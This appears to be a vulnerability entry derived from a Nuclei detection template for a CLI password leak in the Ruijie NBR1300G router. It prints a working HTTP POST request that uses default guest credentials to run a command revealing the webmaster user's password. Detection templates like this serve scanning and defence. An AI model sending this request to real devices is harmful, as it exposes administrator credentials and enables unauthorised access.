# Vulnerability: Ruijie NBR1300G Cli Password Leak - Detect
**Classification:** CWE-200
**Source:** Nuclei Template (`ruijie-nbr1300g-exposure.yaml`)

## Description
Ruijie NBR1300G CLI password leak vulnerability was detected.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /WEB_VMS/LEVEL15/ HTTP/1.1
Host: {{Hostname}}
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=

command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
```

